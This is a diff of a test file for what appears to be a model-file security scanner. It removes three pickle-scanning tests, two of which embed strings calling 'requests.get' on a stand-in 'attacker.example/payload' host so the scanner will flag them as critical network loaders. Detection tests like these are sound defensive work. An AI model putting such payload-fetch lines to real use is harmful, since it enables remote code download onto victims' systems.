@@ -5,7 +5,6 @@ import importlib
 import json
 import logging
 import os
-import pickle
 import re
 import stat
 import struct
@@ -488,72 +487,6 @@ def test_scan_does_not_auto_load_untrusted_local_config(tmp_path: Path) -> None:
     assert result.exit_code == 1
     output_payload = parse_click_json_output(result.output)
     assert any(issue.get("rule_code") == "S405" for issue in output_payload.get("issues", []))
-
-
-def test_scan_cli_allows_inert_pickle_url_metadata_with_url_delimiters(tmp_path: Path) -> None:
-    model_file = tmp_path / "metadata.pkl"
-    model_file.write_bytes(
-        pickle.dumps(
-            {
-                "semicolon_docs": "https://docs.example.invalid/path?x=1;handler=requests.get(url)",
-                "comma_docs": "https://docs.example.invalid/path?x=1,handler=httpx.get(url)",
-                "apostrophe_docs": "https://docs.example.invalid/a'b/os.system(cmd)",
-            },
-            protocol=4,
-        )
-    )
-
-    result = CliRunner().invoke(cli, ["scan", str(model_file), "--format", "json"], catch_exceptions=False)
-
-    assert result.exit_code == 0, result.output
-    output_payload = parse_click_json_output(result.output)
-    assert output_payload["success"] is True
-    assert not any(
-        str(issue.get("severity", "")).lower() == "critical" and issue.get("rule_code") in {"S302", "S310"}
-        for issue in output_payload.get("issues", [])
-    )
-
-
-def test_scan_cli_keeps_executable_pickle_network_loader_url_actionable(tmp_path: Path) -> None:
-    model_file = tmp_path / "loader.pkl"
-    model_file.write_bytes(pickle.dumps({"loader": "requests.get('https://attacker.example/payload')"}, protocol=4))
-
-    result = CliRunner().invoke(cli, ["scan", str(model_file), "--format", "json"], catch_exceptions=False)
-
-    assert result.exit_code == 1, result.output
-    output_payload = parse_click_json_output(result.output)
-    assert any(
-        issue.get("rule_code") == "S302"
-        and str(issue.get("severity", "")).lower() == "critical"
-        and issue.get("details", {}).get("type") == "network_function"
-        and issue.get("details", {}).get("function") == "requests.get"
-        for issue in output_payload.get("issues", [])
-    )
-
-
-def test_scan_cli_keeps_imported_network_alias_pickle_url_actionable(tmp_path: Path) -> None:
-    model_file = tmp_path / "alias-loader.pkl"
-    model_file.write_bytes(
-        pickle.dumps({"loader": "from requests import get\nget('https://attacker.example/payload')"}, protocol=4)
-    )
-
-    result = CliRunner().invoke(cli, ["scan", str(model_file), "--format", "json"], catch_exceptions=False)
-
-    assert result.exit_code == 1, result.output
-    output_payload = parse_click_json_output(result.output)
-    assert any(
-        issue.get("rule_code") == "S302"
-        and str(issue.get("severity", "")).lower() == "critical"
-        and issue.get("details", {}).get("type") == "network_library"
-        and issue.get("details", {}).get("library") == "requests"
-        for issue in output_payload.get("issues", [])
-    )
-    assert any(
-        issue.get("rule_code") == "S309"
-        and issue.get("details", {}).get("type") == "url_detected"
-        and issue.get("details", {}).get("url") == "https://attacker.example/payload"
-        for issue in output_payload.get("issues", [])
-    )
 
 
 def test_scan_cli_tokenizer_json_late_chat_template_after_structure_budget_reports_issue(
